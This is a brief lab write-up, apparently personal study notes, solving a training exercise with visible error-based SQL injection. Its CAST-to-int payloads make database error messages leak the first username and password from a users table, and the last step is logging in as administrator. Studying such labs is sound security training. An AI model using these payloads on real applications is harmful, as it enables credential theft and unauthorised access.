# Visible error-based SQL injection

1. Inject a single quote and observe the following error

![[attachments/sqli-lab-13/file-20260206135416444.png]]

2. Send a generic SELECT query and cast to int and note the error

```
' AND cast((select 1) as int)--
```

![[attachments/sqli-lab-13/file-20260206135416445.png]]

3. Modify the payload to be an equality operator

```
' AND 1=cast((select 1) as int)--
```

4. Send the following request to get the first username, confirming that 'administrator' is the first name

```
x' AND 1=cast((select username from users limit 1) as int)--
```

![[attachments/sqli-lab-13/file-20260206135416447.png]]

5. Now get the password

```
x' AND 1=cast((select password from users limit 1) as int)--
```

6. Log in as the admin to solve the lab

